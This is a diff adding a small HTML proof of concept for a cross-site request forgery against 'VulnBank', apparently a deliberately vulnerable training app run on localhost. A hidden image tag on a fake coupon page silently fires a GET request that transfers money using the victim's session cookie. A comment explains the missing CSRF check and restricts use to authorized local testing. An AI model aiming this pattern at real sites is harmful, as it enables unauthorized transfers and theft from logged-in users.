@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<!--
+  CSRF Proof-of-Concept for VulnBank's /api/transactions/quick-transfer route.
+
+  This file simulates a MALICIOUS third-party page. Host it on a DIFFERENT
+  origin/port than the VulnBank app (e.g. python3 -m http.server 8081 from
+  this folder) to see the effect: while logged into VulnBank in the same
+  browser, simply opening this page silently triggers a transfer, because
+  the browser attaches the `token` cookie automatically and the endpoint
+  performs a state change on a plain GET with no CSRF token check.
+
+  For educational / authorized testing on your own local instance only.
+-->
+<html>
+<head><meta charset="UTF-8"><title>Totally Not Malicious</title></head>
+<body>
+  <h3>You just won a free coupon! Loading...</h3>
+  <!-- Auto-fires a GET to the vulnerable endpoint using the victim's cookie -->
+  <img src="http://localhost:4000/api/transactions/quick-transfer?to=1&amount=99999" style="display:none">
+  <p>If VulnBank's quick-transfer endpoint is vulnerable, an unauthorized
+     transfer just happened in the background. Check the victim account's
+     balance / transaction history to confirm.</p>
+</body>
+</html>
